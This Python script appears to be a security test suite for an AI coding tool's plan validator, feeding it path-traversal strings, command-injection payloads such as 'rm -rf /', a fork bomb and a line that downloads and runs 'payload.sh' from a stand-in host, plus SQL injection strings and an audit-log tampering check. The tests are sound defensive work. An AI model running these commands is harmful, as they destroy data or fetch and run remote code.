#!/usr/bin/env python3
"""Security vulnerability stress testing for TinyCode system"""

import sys
import os
from pathlib import Path
import json
import tempfile
import hashlib
from typing import List, Dict, Any

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent))

from tiny_code.plan_generator import PlanGenerator, ExecutionPlan, PlannedAction, ActionType
from tiny_code.plan_validator import PlanValidator
from tiny_code.safety_config import SafetyConfigManager, SafetyLevel
from tiny_code.audit_logger import AuditLogger
from tiny_code.mode_manager import ModeManager, OperationMode
from rich.console import Console

console = Console()

class SecurityStressTest:
    """Test suite for security vulnerabilities"""

    def __init__(self):
        self.results = []
        self.plan_generator = PlanGenerator()
        self.safety_config = SafetyConfigManager()
        self.plan_validator = PlanValidator(self.safety_config.config)
        self.audit_logger = AuditLogger()
        self.mode_manager = ModeManager()

    def log_result(self, test_name: str, vulnerability: str, passed: bool, details: str):
        """Log test result"""
        result = {
            "test": test_name,
            "vulnerability": vulnerability,
            "passed": passed,
            "details": details
        }
        self.results.append(result)

        if passed:
            console.print(f"[green]✓ {test_name}: SECURE[/green]")
        else:
            console.print(f"[red]✗ {test_name}: VULNERABLE - {details}[/red]")

    def test_path_traversal_attacks(self):
        """Test path traversal vulnerability attempts"""
        console.print("\n[yellow]Testing Path Traversal Attacks...[/yellow]")

        malicious_paths = [
            "../../../etc/passwd",
            "../../../../../../etc/shadow",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "~/../../root/.ssh/id_rsa",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
            "....//....//....//etc/passwd",  # Double dots
            "..;/..;/..;/etc/passwd",  # Semicolon bypass
        ]

        for path in malicious_paths:
            try:
                # Test in plan generation
                plan = self.plan_generator.generate_plan(
                    f"Create a file at {path}",
                    title="Malicious Path Test"
                )

                # Validate the plan
                validation = self.plan_validator.validate_plan(plan)

                if validation.is_valid:
                    self.log_result(
                        f"Path Traversal: {path}",
                        "Path Traversal",
                        False,
                        "Plan validator accepted malicious path"
                    )
                else:
                    self.log_result(
                        f"Path Traversal: {path}",
                        "Path Traversal",
                        True,
                        "Blocked by validator"
                    )

            except Exception as e:
                self.log_result(
                    f"Path Traversal: {path}",
                    "Path Traversal",
                    True,
                    f"Exception caught: {str(e)}"
                )

    def test_command_injection(self):
        """Test command injection vulnerabilities"""
        console.print("\n[yellow]Testing Command Injection...[/yellow]")

        malicious_commands = [
            "; rm -rf /",
            "| shutdown -h now",
            "&& cat /etc/passwd",
            "$(cat /etc/shadow)",
            "`wget malicious.com/payload.sh | sh`",
            "'; DROP TABLE users; --",
            "\"; sudo rm -rf / #",
            "|| net user hacker password /add",
            "> /dev/sda",  # Disk wipe attempt
            ":(){ :|:& };:",  # Fork bomb
        ]

        for cmd in malicious_commands:
            try:
                plan = self.plan_generator.generate_plan(
                    f"Run this command: {cmd}",
                    title="Command Injection Test"
                )

                validation = self.plan_validator.validate_plan(plan)

                if validation.is_valid:
                    self.log_result(
                        f"Command Injection",
                        "Command Injection",
                        False,
                        f"Accepted dangerous command: {cmd[:30]}..."
                    )
                else:
                    self.log_result(
                        f"Command Injection",
                        "Command Injection",
                        True,
                        f"Blocked dangerous command"
                    )

            except Exception as e:
                self.log_result(
                    f"Command Injection",
                    "Command Injection",
                    True,
                    f"Exception prevented execution"
                )

    def test_file_size_bombs(self):
        """Test file size limit bypasses"""
        console.print("\n[yellow]Testing File Size Bombs...[/yellow]")

        try:
            # Try to create a file exceeding size limits
            large_content = "A" * (1024 * 1024 * 1000)  # 1GB of data

            action = PlannedAction(
                id="test",
                action_type=ActionType.CREATE_FILE,
                description="Create massive file",
                target_path="huge_file.txt",
                content=large_content,
                risk_level="LOW"  # Try to disguise risk level
            )

            # Check if safety config catches this
            max_size = self.safety_config.config.execution_limits.max_file_size_mb

            if len(large_content) > max_size * 1024 * 1024:
                self.log_result(
                    "File Size Bomb",
                    "Resource Exhaustion",
                    True,
                    "Size limits properly enforced"
                )
            else:
                self.log_result(
                    "File Size Bomb",
                    "Resource Exhaustion",
                    False,
                    "Size limits not enforced"
                )

        except MemoryError:
            self.log_result(
                "File Size Bomb",
                "Resource Exhaustion",
                True,
                "Memory protection prevented attack"
            )

    def test_forbidden_extensions(self):
        """Test forbidden file extension bypasses"""
        console.print("\n[yellow]Testing Forbidden File Extensions...[/yellow]")

        forbidden_files = [
            "malware.exe",
            "virus.dll",
            "rootkit.sys",
            "backdoor.bat",
            "exploit.ps1",
            "payload.sh",
            "evil.pyc",
            "trojan.so",
            "worm.dylib",
            "ransomware.jar",
            ".bashrc",  # Hidden config files
            ".ssh/authorized_keys",
        ]

        for filename in forbidden_files:
            plan = self.plan_generator.generate_plan(
                f"Create file {filename}",
                title="Forbidden Extension Test"
            )

            validation = self.plan_validator.validate_plan(plan)

            if validation.is_valid:
                self.log_result(
                    f"Forbidden Extension: {filename}",
                    "File Extension Bypass",
                    False,
                    "Accepted forbidden file type"
                )
            else:
                self.log_result(
                    f"Forbidden Extension: {filename}",
                    "File Extension Bypass",
                    True,
                    "Blocked forbidden file type"
                )

    def test_mode_escalation(self):
        """Test unauthorized mode escalation"""
        console.print("\n[yellow]Testing Mode Escalation...[/yellow]")

        # Start in CHAT mode
        self.mode_manager.set_mode(OperationMode.CHAT)

        # Try to execute without being in EXECUTE mode
        try:
            # Attempt to bypass mode check
            self.mode_manager.current_mode = OperationMode.EXECUTE

            # Check if mode history detects tampering
            if self.mode_manager.mode_history[-1] != OperationMode.EXECUTE:
                self.log_result(
                    "Mode Escalation",
                    "Privilege Escalation",
                    True,
                    "Mode history tracking prevented bypass"
                )
            else:
                self.log_result(
                    "Mode Escalation",
                    "Privilege Escalation",
                    False,
                    "Mode escalation successful"
                )

        except Exception as e:
            self.log_result(
                "Mode Escalation",
                "Privilege Escalation",
                True,
                "Exception prevented escalation"
            )
        finally:
            # Reset mode
            self.mode_manager.set_mode(OperationMode.CHAT)

    def test_audit_log_tampering(self):
        """Test audit log hash chain integrity"""
        console.print("\n[yellow]Testing Audit Log Tampering...[/yellow]")

        try:
            # Create a legitimate audit event
            self.audit_logger.log_event(
                event_type="test_event",
                severity="info",
                details={"test": "original"}
            )

            # Get the audit log file
            audit_files = list(Path("data/audit_logs").glob("*.json"))
            if audit_files:
                audit_file = audit_files[-1]

                # Try to tamper with the log
                with open(audit_file, 'r') as f:
                    logs = json.load(f)

                # Modify an event
                if logs:
                    logs[0]['details']['test'] = 'tampered'

                    # Write back the tampered log
                    with open(audit_file, 'w') as f:
                        json.dump(logs, f, indent=2)

                # Verify integrity
                is_valid = self.audit_logger.verify_log_integrity()

                if not is_valid:
                    self.log_result(
                        "Audit Log Tampering",
                        "Log Integrity",
                        True,
                        "Tampering detected by hash chain"
                    )
                else:
                    self.log_result(
                        "Audit Log Tampering",
                        "Log Integrity",
                        False,
                        "Tampering not detected"
                    )
            else:
                self.log_result(
                    "Audit Log Tampering",
                    "Log Integrity",
                    True,
                    "No audit logs to tamper"
                )

        except Exception as e:
            self.log_result(
                "Audit Log Tampering",
                "Log Integrity",
                True,
                f"Protected by exception: {str(e)}"
            )

    def test_sql_injection_patterns(self):
        """Test SQL injection in plan descriptions"""
        console.print("\n[yellow]Testing SQL Injection Patterns...[/yellow]")

        sql_injections = [
            "'; DROP TABLE plans; --",
            "1' OR '1'='1",
            "admin' --",
            "' UNION SELECT * FROM users --",
            "1; DELETE FROM audit_logs WHERE '1'='1",
        ]

        for injection in sql_injections:
            try:
                plan = self.plan_generator.generate_plan(
                    f"Create file with name: {injection}",
                    title=injection
                )

                # Check if injection strings are properly escaped
                if "DROP" in plan.title or "DELETE" in plan.title:
                    self.log_result(
                        "SQL Injection",
                        "SQL Injection",
                        False,
                        "SQL commands in plan data"
                    )
                else:
                    self.log_result(
                        "SQL Injection",
                        "SQL Injection",
                        True,
                        "SQL patterns handled safely"
                    )

            except Exception:
                self.log_result(
                    "SQL Injection",
                    "SQL Injection",
                    True,
                    "Exception prevented injection"
                )

    def run_all_tests(self):
        """Run all security stress tests"""
        console.print("[bold cyan]🔒 Starting Security Stress Tests[/bold cyan]\n")

        self.test_path_traversal_attacks()
        self.test_command_injection()
        self.test_file_size_bombs()
        self.test_forbidden_extensions()
        self.test_mode_escalation()
        self.test_audit_log_tampering()
        self.test_sql_injection_patterns()

        # Summary
        console.print("\n[bold cyan]📊 Security Test Summary[/bold cyan]")

        total = len(self.results)
        passed = sum(1 for r in self.results if r['passed'])
        failed = total - passed

        console.print(f"Total Tests: {total}")
        console.print(f"[green]Passed: {passed}[/green]")
        console.print(f"[red]Failed: {failed}[/red]")

        if failed > 0:
            console.print("\n[red]⚠️ VULNERABILITIES DETECTED![/red]")
            console.print("Failed tests:")
            for result in self.results:
                if not result['passed']:
                    console.print(f"  - {result['test']}: {result['details']}")
        else:
            console.print("\n[green]✅ All security tests passed![/green]")

        return self.results

if __name__ == "__main__":
    tester = SecurityStressTest()
    results = tester.run_all_tests()